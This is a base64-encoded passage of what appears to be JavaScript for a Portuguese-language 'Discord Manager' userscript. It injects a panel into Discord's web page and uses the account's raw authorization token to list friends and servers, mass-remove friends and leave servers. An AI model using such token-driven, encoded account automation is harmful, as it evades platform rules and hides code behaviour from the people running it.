zZTI4OS1pbnRlcmFjdGl2ZSBfOTcyYTBkMjJjOGFmYTdmMC1pbnRlcmFjdGl2ZSBfOTcyYTBkMjJjOGFmYTdmMC1saW5rQnV0dG9uIj4KICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJfOTcyYTBkMjJjOGFmYTdmMC1saW5rIiBkYXRhLWxpc3QtaXRlbS1pZD0icHJpdmF0ZS1jaGFubmVscy11aWRfMzBfX19kaXNjb3JkX21hbmFnZXIiIHRhYmluZGV4PSItMSIgaHJlZj0iIyI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iXzIwYTUzODQ2ZmUyZTg1MTMtbGF5b3V0IF85NzJhMGQyMmM4YWZhN2YwLWF2YXRhcldpdGhUZXh0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iXzIwYTUzODQ2ZmUyZTg1MTMtYXZhdGFyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzdmcgY2xhc3M9Il85NzJhMGQyMmM4YWZhN2YwLWxpbmtCdXR0b25JY29uIiBhcmlhLWhpZGRlbj0idHJ1ZSIgcm9sZT0iaW1nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cGF0aCBmaWxsPSJjdXJyZW50Q29sb3IiIGQ9Ik0xMiAyQzYuNDggMiAyIDYuNDggMiAxMnM0LjQ4IDEwIDEwIDEwIDEwLTQuNDggMTAtMTBTMTcuNTIgMiAxMiAyem0tMSAxNy45M2MtMy45NS0uNDktNy0zLjg1LTctNy45MyAwLS42Mi4wOC0xLjIxLjIxLTEuNzlMOSAxNXYxYzAgMS4xLjkgMiAyIDJ2MS45M3ptNi45LTIuNTRjLS4yNi0uODEtMS0xLjM5LTEuOS0xLjM5aC0xdi0zYzAtLjU1LS40NS0xLTEtMUg4di0yaDJjLjU1IDAgMS0uNDUgMS0xVjdoMmMxLjEgMCAyLS45IDItMnYtLjQxYzIuOTMgMS4xOSA1IDQuMDYgNSA3LjQxIDAgMi4wOC0uOCAzLjk3LTIuMSA1LjM5eiIvPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zdmc+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJfMjBhNTM4NDZmZTJlODUxMy1jb250ZW50Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Il8yMGE1Mzg0NmZlMmU4NTEzLW5hbWVBbmREZWNvcmF0b3JzIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJfMjBhNTM4NDZmZTJlODUxMy1sZWZ0TmFtZSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Il8yMGE1Mzg0NmZlMmU4NTEzLW5hbWUiPkRpc2NvcmQgTWFuYWdlcjwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICBgOwoKICAgICAgICBjb25zdCBxdWVzdHNDb250YWluZXIgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdbZGF0YS1saXN0LWl0ZW0taWQqPSJxdWVzdHMiXScpOwoKICAgICAgICBpZiAocXVlc3RzQ29udGFpbmVyKSB7CiAgICAgICAgICAgIGNvbnN0IHF1ZXN0c0xpc3RJdGVtID0gcXVlc3RzQ29udGFpbmVyLmNsb3Nlc3QoJ2xpJyk7CiAgICAgICAgICAgIGlmIChxdWVzdHNMaXN0SXRlbSAmJiBxdWVzdHNMaXN0SXRlbS5wYXJlbnROb2RlKSB7CiAgICAgICAgICAgICAgICBxdWVzdHNMaXN0SXRlbS5wYXJlbnROb2RlLmluc2VydEJlZm9yZShtYW5hZ2VyQnV0dG9uLCBxdWVzdHNMaXN0SXRlbS5uZXh0U2libGluZyk7CgogICAgICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgbWFuYWdlckJ1dHRvbi5xdWVyeVNlbGVjdG9yKCdhJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb250YWluZXIuc3R5bGUuZGlzcGxheSA9PT0gJ25vbmUnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRhaW5lci5zdHlsZS5hbmltYXRpb24gPSAnZmFkZUluIDAuM3MgY3ViaWMtYmV6aWVyKDAuMTYsIDEsIDAuMywgMSknOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGFpbmVyLmNsYXNzTGlzdC5hZGQoJ2Nsb3NpbmcnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRhaW5lci5jbGFzc0xpc3QucmVtb3ZlKCdjbG9zaW5nJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCAzMDApOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9LCAxMDApOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgc2V0VGltZW91dChjcmVhdGVEaXNjb3JkTWFuYWdlckJ1dHRvbiwgMTAwMCk7CiAgICAgICAgfQogICAgfTsKCiAgICBmdW5jdGlvbiBzaG93Tm90aWZpY2F0aW9uKG1lc3NhZ2UsIHR5cGUgPSAnaW5mbycsIHRpdGxlID0gJycsIGljb25VcmwgPSAnJywgbmFtZSA9ICcnKSB7CiAgICAgICAgY29uc3Qgbm90aWZpY2F0aW9uID0gewogICAgICAgICAgICBtZXNzYWdlLAogICAgICAgICAgICB0eXBlLAogICAgICAgICAgICB0aXRsZSwKICAgICAgICAgICAgaWNvblVybCwKICAgICAgICAgICAgbmFtZSwKICAgICAgICAgICAgaWQ6IERhdGUubm93KCkgKyBNYXRoLnJhbmRvbSgpCiAgICAgICAgfTsKCiAgICAgICAgaWYgKGFjdGl2ZU5vdGlmaWNhdGlvbnMgPj0gTUFYX05PVElGSUNBVElPTlMpIHsKICAgICAgICAgICAgbm90aWZpY2F0aW9uUXVldWUucHVzaChub3RpZmljYXRpb24pOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBkaXNwbGF5Tm90aWZpY2F0aW9uKG5vdGlmaWNhdGlvbik7CiAgICB9CgogICAgZnVuY3Rpb24gZGlzcGxheU5vdGlmaWNhdGlvbihub3RpZmljYXRpb24pIHsKICAgICAgICBhY3RpdmVOb3RpZmljYXRpb25zKys7CgogICAgICAgIGNvbnN0IGljb25zID0gewogICAgICAgICAgICBzdWNjZXNzOiAn4pyUJywKICAgICAgICAgICAgZXJyb3I6ICfinJUnLAogICAgICAgICAgICB3YXJuaW5nOiAn4pqgJywKICAgICAgICAgICAgaW5mbzogJ+KEuScKICAgICAgICB9OwoKICAgICAgICBjb25zdCBub3RpZkVsZW1lbnQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgICAgICBub3RpZkVsZW1lbnQuY2xhc3NOYW1lID0gYGRmbS1ub3RpZmljYXRpb24gJHtub3RpZmljYXRpb24udHlwZX1gOwogICAgICAgIG5vdGlmRWxlbWVudC5kYXRhc2V0LmlkID0gbm90aWZpY2F0aW9uLmlkOwoKICAgICAgICBpZiAoKG5vdGlmaWNhdGlvbi50eXBlID09PSAnZnJpZW5kLXJlbW92ZWQnIHx8IG5vdGlmaWNhdGlvbi50eXBlID09PSAnc2VydmVyLWxlZnQnKSAmJiBub3RpZmljYXRpb24uaWNvblVybCAmJiBub3RpZmljYXRpb24ubmFtZSkgewogICAgICAgICAgICBjb25zdCBpc1NlcnZlckxlZnQgPSBub3RpZmljYXRpb24udHlwZSA9PT0gJ3NlcnZlci1sZWZ0JzsKICAgICAgICAgICAgbm90aWZFbGVtZW50LmNsYXNzTGlzdC5hZGQoaXNTZXJ2ZXJMZWZ0ID8gJ3NlcnZlci1sZWZ0JyA6ICdmcmllbmQtcmVtb3ZlZCcpOwogICAgICAgICAgICBub3RpZkVsZW1lbnQuaW5uZXJIVE1MID0gYAogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iJHtpc1NlcnZlckxlZnQgPyAnZGZtLXNlcnZlci1sZWZ0LWNvbnRlbnQnIDogJ2RmbS1mcmllbmQtcmVtb3ZlZC1jb250ZW50J30iPgogICAgICAgICAgICAgICAgICAgIDxpbWcgY2xhc3M9IiR7aXNTZXJ2ZXJMZWZ0ID8gJ2RmbS1zZXJ2ZXItbGVmdC1pY29uJyA6ICdkZm0tZnJpZW5kLXJlbW92ZWQtYXZhdGFyJ30iIHNyYz0iJHtub3RpZmljYXRpb24uaWNvblVybH0iIG9uZXJyb3I9InRoaXMuc3JjPSdodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9lbWJlZC9hdmF0YXJzLzAucG5nJyI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iJHtpc1NlcnZlckxlZnQgPyAnZGZtLXNlcnZlci1sZWZ0LWluZm8nIDogJ2RmbS1mcmllbmQtcmVtb3ZlZC1pbmZvJ30iPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSIke2lzU2VydmVyTGVmdCA/ICdkZm0tc2VydmVyLWxlZnQtbmFtZScgOiAnZGZtLWZyaWVuZC1yZW1vdmVkLW5hbWUnfSI+JHtub3RpZmljYXRpb24ubmFtZX08L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iJHtpc1NlcnZlckxlZnQgPyAnZGZtLXNlcnZlci1sZWZ0LXRleHQnIDogJ2RmbS1mcmllbmQtcmVtb3ZlZC10ZXh0J30iPiR7aXNTZXJ2ZXJMZWZ0ID8gJ1NlcnZpZG9yIGFiYW5kb25hZG8gY29tIHN1Y2Vzc28nIDogJ0FtaWdvIHJlbW92aWRvIGNvbSBzdWNlc3NvJ308L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tbm90aWZpY2F0aW9uLWNsb3NlIj7DlzwvYnV0dG9uPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIGA7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgbm90aWZFbGVtZW50LmlubmVySFRNTCA9IGAKICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1ub3RpZmljYXRpb24taWNvbiI+JHtpY29uc1tub3RpZmljYXRpb24udHlwZV0gfHwgaWNvbnMuaW5mb308L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1ub3RpZmljYXRpb24tY29udGVudCI+CiAgICAgICAgICAgICAgICAgICAgJHtub3RpZmljYXRpb24udGl0bGUgPyBgPGRpdiBjbGFzcz0iZGZtLW5vdGlmaWNhdGlvbi10aXRsZSI+JHtub3RpZmljYXRpb24udGl0bGV9PC9kaXY+YCA6ICcnfQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1ub3RpZmljYXRpb24tbWVzc2FnZSI+JHtub3RpZmljYXRpb24ubWVzc2FnZX08L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLW5vdGlmaWNhdGlvbi1jbG9zZSI+w5c8L2J1dHRvbj4KICAgICAgICAgICAgYDsKICAgICAgICB9CgogICAgICAgIG5vdGlmaWNhdGlvbkNvbnRhaW5lci5hcHBlbmRDaGlsZChub3RpZkVsZW1lbnQpOwogICAgICAgIG5vdGlmRWxlbWVudC5xdWVyeVNlbGVjdG9yKCcuZGZtLW5vdGlmaWNhdGlvbi1jbG9zZScpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gcmVtb3ZlTm90aWZpY2F0aW9uKG5vdGlmRWxlbWVudCkpOwoKICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgaWYgKG5vdGlmRWxlbWVudC5wYXJlbnRFbGVtZW50KSB7CiAgICAgICAgICAgICAgICByZW1vdmVOb3RpZmljYXRpb24obm90aWZFbGVtZW50KTsKICAgICAgICAgICAgfQogICAgICAgIH0sIDUwMDApOwogICAgfQoKICAgIGZ1bmN0aW9uIHJlbW92ZU5vdGlmaWNhdGlvbihub3RpZkVsZW1lbnQpIHsKICAgICAgICBub3RpZkVsZW1lbnQuY2xhc3NMaXN0LmFkZCgncmVtb3ZpbmcnKTsKICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgbm90aWZFbGVtZW50LnJlbW92ZSgpOwogICAgICAgICAgICBhY3RpdmVOb3RpZmljYXRpb25zLS07CiAgICAgICAgICAgIGlmIChub3RpZmljYXRpb25RdWV1ZS5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICBkaXNwbGF5Tm90aWZpY2F0aW9uKG5vdGlmaWNhdGlvblF1ZXVlLnNoaWZ0KCkpOwogICAgICAgICAgICB9CiAgICAgICAgfSwgMzAwKTsKICAgIH0KCiAgICBmdW5jdGlvbiBzaG93U2V0dGluZ3NNb2RhbCgpIHsKICAgICAgICBjb25zdCBtb2RhbCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgICAgIG1vZGFsLmNsYXNzTmFtZSA9ICdkZm0tc2V0dGluZ3MtbW9kYWwnOwogICAgICAgIG1vZGFsLmlubmVySFRNTCA9IGAKICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNldHRpbmdzLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNldHRpbmdzLXRpdGxlIj5Db25maWd1cmHDp8O1ZXM8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZXR0aW5ncy1vcHRpb24iPgogICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iZGZtLXNldHRpbmdzLWxhYmVsIj5UZW1wbyBlbnRyZSByZXF1aXNpw6fDtWVzOjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBjbGFzcz0iZGZtLXNldHRpbmdzLXNlbGVjdCIgaWQ9InJlcXVlc3QtZGVsYXkiPgogICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSI1MDAiICR7cmVxdWVzdERlbGF5ID09PSA1MDAgPyAnc2VsZWN0ZWQnIDogJyd9PjUwMG1zPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9IjEwMDAiICR7cmVxdWVzdERlbGF5ID09PSAxMDAwID8gJ3NlbGVjdGVkJyA6ICcnfT4xMDAwbXM8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iMzAwMCIgJHtyZXF1ZXN0RGVsYXkgPT09IDMwMDAgPyAnc2VsZWN0ZWQnIDogJyd9PjMwMDBtczwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgIDwvc2VsZWN0PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbW9kYWwtYWN0aW9ucyI+CiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biBzZWNvbmRhcnkiIGlkPSJzZXR0aW5ncy1jYW5jZWwiPkNhbmNlbGFyPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biIgaWQ9InNldHRpbmdzLXNhdmUiPlNhbHZhcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIGA7CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChtb2RhbCk7CgogICAgICAgIG1vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNzZXR0aW5ncy1jYW5jZWwnKS5vbmNsaWNrID0gKCkgPT4gbW9kYWwucmVtb3ZlKCk7CiAgICAgICAgbW9kYWwucXVlcnlTZWxlY3RvcignI3NldHRpbmdzLXNhdmUnKS5vbmNsaWNrID0gKCkgPT4gewogICAgICAgICAgICByZXF1ZXN0RGVsYXkgPSBwYXJzZUludChtb2RhbC5xdWVyeVNlbGVjdG9yKCcjcmVxdWVzdC1kZWxheScpLnZhbHVlKTsKICAgICAgICAgICAgbW9kYWwucmVtb3ZlKCk7CiAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oJ0NvbmZpZ3VyYcOnw7VlcyBzYWx2YXMhJywgJ3N1Y2Nlc3MnKTsKICAgICAgICB9OwogICAgfQoKICAgIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgY29udGFpbmVyLmlkID0gJ2Rpc2NvcmQtZnJpZW5kLW1hbmFnZXInOwogICAgY29udGFpbmVyLmlubmVySFRNTCA9IGAKICAgICAgICA8ZGl2IGNsYXNzPSJkZm0taGVhZGVyIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXRpdGxlIj5EaXNjb3JkIE1hbmFnZXI8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWNvbnRyb2xzIj4KICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS1idG4taWNvbiIgaWQ9ImRmbS1zZXR0aW5ncyIgdGl0bGU9IkNvbmZpZ3VyYcOnw7VlcyI+4pqZPC9idXR0b24+CiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tYnRuLWljb24iIGlkPSJkZm0tbWluaW1pemUiIHRpdGxlPSJNaW5pbWl6YXIiPuKIkjwvYnV0dG9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tdGFicyI+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS10YWIgYWN0aXZlIiBkYXRhLXRhYj0iZnJpZW5kcyI+VXN1w6FyaW9zPC9idXR0b24+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS10YWIiIGRhdGEtdGFiPSJzZXJ2ZXJzIj5TZXJ2aWRvcmVzPC9idXR0b24+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWNvbnRlbnQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tdGFiLWNvbnRlbnQgYWN0aXZlIiBpZD0iZnJpZW5kcy10YWIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWxvYWRpbmciPkNhcnJlZ2FuZG8gYW1pZ29zPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tdGFiLWNvbnRlbnQiIGlkPSJzZXJ2ZXJzLXRhYiI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbG9hZGluZyI+Q2FycmVnYW5kbyBzZXJ2aWRvcmVzPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgYDsKICAgIGNvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjb250YWluZXIpOwoKICAgIGxldCBpc0RyYWdnaW5nID0gZmFsc2U7CiAgICBsZXQgb2Zmc2V0WCwgb2Zmc2V0WTsKCiAgICBjb25zdCBoZWFkZXIgPSBjb250YWluZXIucXVlcnlTZWxlY3RvcignLmRmbS1oZWFkZXInKTsKICAgIGhlYWRlci5hZGRFdmVudExpc3RlbmVyKCdtb3VzZWRvd24nLCAoZSkgPT4gewogICAgICAgIGlmIChlLnRhcmdldC5jbG9zZXN0KCcuZGZtLWJ0bi1pY29uJykpIHJldHVybjsKICAgICAgICBpc0RyYWdnaW5nID0gdHJ1ZTsKICAgICAgICBjb25zdCByZWN0ID0gY29udGFpbmVyLmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpOwogICAgICAgIG9mZnNldFggPSBlLmNsaWVudFggLSByZWN0LmxlZnQ7CiAgICAgICAgb2Zmc2V0WSA9IGUuY2xpZW50WSAtIHJlY3QudG9wOwogICAgICAgIGNvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gJ25vbmUnOwogICAgfSk7CgogICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignbW91c2Vtb3ZlJywgKGUpID0+IHsKICAgICAgICBpZiAoIWlzRHJhZ2dpbmcpIHJldHVybjsKICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgY29udGFpbmVyLnN0eWxlLmxlZnQgPSBgJHtlLmNsaWVudFggLSBvZmZzZXRYfXB4YDsKICAgICAgICBjb250YWluZXIuc3R5bGUudG9wID0gYCR7ZS5jbGllbnRZIC0gb2Zmc2V0WX1weGA7CiAgICAgICAgY29udGFpbmVyLnN0eWxlLnRyYW5zZm9ybSA9ICdub25lJzsKICAgIH0pOwoKICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ21vdXNldXAnLCAoKSA9PiB7CiAgICAgICAgaWYgKGlzRHJhZ2dpbmcpIHsKICAgICAgICAgICAgaXNEcmFnZ2luZyA9IGZhbHNlOwogICAgICAgICAgICBjb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICdhbGwgMC4zcyBjdWJpYy1iZXppZXIoMC4xNiwgMSwgMC4zLCAxKSc7CiAgICAgICAgfQogICAgfSk7CgogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RmbS1zZXR0aW5ncycpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgc2hvd1NldHRpbmdzTW9kYWwpOwoKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkZm0tbWluaW1pemUnKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsKICAgICAgICBjb250YWluZXIuY2xhc3NMaXN0LmFkZCgnY2xvc2luZycpOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICBjb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICdub25lJzsKICAgICAgICAgICAgY29udGFpbmVyLmNsYXNzTGlzdC5yZW1vdmUoJ2Nsb3NpbmcnKTsKICAgICAgICB9LCAzMDApOwogICAgfSk7CgogICAgY29udGFpbmVyLnF1ZXJ5U2VsZWN0b3JBbGwoJy5kZm0tdGFiJykuZm9yRWFjaCh0YWIgPT4gewogICAgICAgIHRhYi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsKICAgICAgICAgICAgY29udGFpbmVyLnF1ZXJ5U2VsZWN0b3JBbGwoJy5kZm0tdGFiJykuZm9yRWFjaCh0ID0+IHQuY2xhc3NMaXN0LnJlbW92ZSgnYWN0aXZlJykpOwogICAgICAgICAgICBjb250YWluZXIucXVlcnlTZWxlY3RvckFsbCgnLmRmbS10YWItY29udGVudCcpLmZvckVhY2goYyA9PiBjLmNsYXNzTGlzdC5yZW1vdmUoJ2FjdGl2ZScpKTsKCiAgICAgICAgICAgIHRhYi5jbGFzc0xpc3QuYWRkKCdhY3RpdmUnKTsKICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoYCR7dGFiLmRhdGFzZXQudGFifS10YWJgKS5jbGFzc0xpc3QuYWRkKCdhY3RpdmUnKTsKICAgICAgICB9KTsKICAgIH0pOwoKICAgIGNvbnN0IGZldGNoRnJpZW5kcyA9IGFzeW5jICgpID0+IHsKICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvcmVsYXRpb25zaGlwcycsIHsKICAgICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAgICAgJ2F1dGhvcml6YXRpb24nOiB0b2tlbiwKICAgICAgICAgICAgICAgICd4LXN1cGVyLXByb3BlcnRpZXMnOiB4U3VwZXJQcm9wZXJ0aWVzCiAgICAgICAgICAgIH0KICAgICAgICB9KTsKICAgICAgICByZXR1cm4gYXdhaXQgcmVzcG9uc2UuanNvbigpOwogICAgfTsKCiAgICBjb25zdCBmZXRjaFNlcnZlcnMgPSBhc3luYyAoKSA9PiB7CiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lL2d1aWxkcycsIHsKICAgICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAgICAgJ2F1dGhvcml6YXRpb24nOiB0b2tlbiwKICAgICAgICAgICAgICAgICd4LXN1cGVyLXByb3BlcnRpZXMnOiB4U3VwZXJQcm9wZXJ0aWVzCiAgICAgICAgICAgIH0KICAgICAgICB9KTsKICAgICAgICByZXR1cm4gYXdhaXQgcmVzcG9uc2UuanNvbigpOwogICAgfTsKCiAgICBjb25zdCByZW1vdmVGcmllbmQgPSBhc3luYyAodXNlcklkLCB1c2VyTmFtZSwgYXZhdGFyVXJsKSA9PiB7CiAgICAgICAgYXdhaXQgZmV0Y2goYGh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZS9yZWxhdGlvbnNoaXBzLyR7dXNlcklkfWAsIHsKICAgICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAgICAgJ2F1dGhvcml6YXRpb24nOiB0b2tlbiwKICAgICAgICAgICAgICAgICd4LXN1cGVyLXByb3BlcnRpZXMnOiB4U3VwZXJQcm9wZXJ0aWVzCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIG1ldGhvZDogJ0RFTEVURScKICAgICAgICB9KTsKCiAgICAgICAgc2hvd05vdGlmaWNhdGlvbignJywgJ2ZyaWVuZC1yZW1vdmVkJywgJycsIGF2YXRhclVybCwgdXNlck5hbWUpOwogICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gc2V0VGltZW91dChyZXNvbHZlLCByZXF1ZXN0RGVsYXkpKTsKICAgIH07CgogICAgY29uc3QgbGVhdmVTZXJ2ZXIgPSBhc3luYyAoc2VydmVySWQsIHNlcnZlck5hbWUsIGljb25VcmwpID0+IHsKICAgICAgICBhd2FpdCBmZXRjaChgaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lL2d1aWxkcy8ke3NlcnZlcklkfWAsIHsKICAgICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAgICAgJ2F1dGhvcml6YXRpb24nOiB0b2tlbiwKICAgICAgICAgICAgICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAneC1zdXBlci1wcm9wZXJ0aWVzJzogeFN1cGVyUHJvcGVydGllcwogICAgICAgICAgICB9LAogICAgICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7IGx1cmtpbmc6IGZhbHNlIH0pLAogICAgICAgICAgICBtZXRob2Q6ICdERUxFVEUnCiAgICAgICAgfSk7CgogICAgICAgIHNob3dOb3RpZmljYXRpb24oJycsICdzZXJ2ZXItbGVmdCcsICcnLCBpY29uVXJsLCBzZXJ2ZXJOYW1lKTsKICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgcmVxdWVzdERlbGF5KSk7CiAgICB9OwoKICAgIGNvbnN0IGdldENoYW5uZWxJZCA9IGFzeW5jICh1c2VySWQpID0+IHsKICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvY2hhbm5lbHMnLCB7CiAgICAgICAgICAgIGhlYWRlcnM6IHsKICAgICAgICAgICAgICAgICdhdXRob3JpemF0aW9uJzogdG9rZW4sCiAgICAgICAgICAgICAgICAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAgICAgICAgICAgJ3gtc3VwZXItcHJvcGVydGllcyc6IHhTdXBl